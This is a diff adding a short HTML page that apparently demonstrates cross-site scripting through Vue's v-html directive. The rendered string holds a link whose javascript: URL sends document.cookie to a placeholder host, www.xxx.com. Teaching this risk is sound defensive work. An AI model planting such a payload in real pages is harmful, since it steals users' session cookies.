@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <div v-html="str" class="root"></div>
+</body>
+<script>
+    new Vue({
+        el: '.root',
+        data: {
+            str: '<a href=javascript:location.href="http://www.xxx.com"+document.cookie>点击链接</a>'
+        }
+    })
+</script>
+
+</html>
